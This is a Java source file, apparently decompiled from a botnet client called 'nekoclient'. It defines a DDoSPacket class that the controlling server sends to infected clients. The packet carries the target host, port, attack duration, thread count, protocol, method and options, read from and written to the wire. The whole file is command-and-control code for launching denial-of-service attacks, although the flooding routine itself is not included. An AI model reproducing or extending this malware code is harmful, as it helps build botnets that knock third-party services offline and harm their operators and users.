package dev.neko.nekoclient.packet.impl.server;

import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.buffer.FriendlyByteBuffer;
import dev.neko.nekoclient.api.buffer.StreamByteBuffer;
import dev.neko.nekoclient.api.ddos.Method;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.ThreadsUnit;
import dev.neko.nekoclient.packet.Direction;
import dev.neko.nekoclient.packet.impl.NoncePacket;
import java.io.IOException;

public class DDoSPacket extends NoncePacket {
   private String host;
   private int port;
   private long time;
   private int threads;
   private ThreadsUnit threadsUnit;
   private Protocol protocol;
   private Method method;
   private JsonObject options;

   public DDoSPacket() {
   }

   public DDoSPacket(String host, int port, long time, int threads, Protocol protocol, Method method, JsonObject options) {
      this.host = host;
      this.port = port;
      this.time = time;
      this.threads = threads;
      this.protocol = protocol;
      this.method = method;
      this.options = options;
   }

   @Override
   public void read(FriendlyByteBuffer buffer) throws IOException {
      super.read(buffer);
      this.host = buffer.getString();
      this.port = buffer.getUnsignedShort();
      this.time = buffer.getLong();
      this.threads = buffer.getInt();
      this.threadsUnit = ThreadsUnit.valueOf(buffer.getString());
      this.protocol = Protocol.valueOf(buffer.getString());
      this.method = Method.valueOf(buffer.getString());
      this.options = Json.parse(buffer.getString()).asObject();
   }

   @Override
   public void write(StreamByteBuffer buffer) throws IOException {
      super.write(buffer);
      buffer.putString(this.host);
      buffer.putUnsignedShort(this.port);
      buffer.putLong(this.time);
      buffer.putInt(this.threads);
      buffer.putString(this.threadsUnit.name());
      buffer.putString(this.protocol.name());
      buffer.putString(this.method.name());
      buffer.putString(this.options.toString());
   }

   @Override
   public Direction getDirection() {
      return Direction.SERVER_TO_CLIENT;
   }

   @Override
   public String getName() {
      return "ddos";
   }

   public final String getHost() {
      return this.host;
   }

   public final int getPort() {
      return this.port;
   }

   public final long getTime() {
      return this.time;
   }

   public final Protocol getProtocol() {
      return this.protocol;
   }

   public final int getThreads() {
      return this.threads;
   }

   public final ThreadsUnit getThreadsUnit() {
      return this.threadsUnit;
   }

   public final Method getMethod() {
      return this.method;
   }

   public final JsonObject getOptions() {
      return this.options;
   }
}
